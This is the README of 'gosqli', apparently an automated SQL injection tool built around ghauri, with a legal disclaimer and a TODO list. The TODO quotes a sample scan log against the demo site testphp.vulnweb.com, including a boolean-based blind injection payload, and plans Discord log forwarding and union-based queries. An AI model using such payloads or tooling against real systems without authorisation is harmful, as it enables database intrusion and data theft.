# gosqli

## **Legal disclaimer**
```
Usage of gosqli for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local,state and federal laws. 
Developer assume no liability and is not responsible for any misuse or damage caused by this program.
```

## **TODO**
  - Send ghauri logs to discord, e.g.
```
cat /root/.ghauri/testphp.vulnweb.com/log

# URL:
http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*

# LOGS:
Ghauri identified the following injection point(s) with a total of 343 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace
    Payload: id=(SELECT (CASE WHEN (07973=7973) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))
---
hostname: 'ip-10-0-0-222'
```
  - Add support for Union based queries
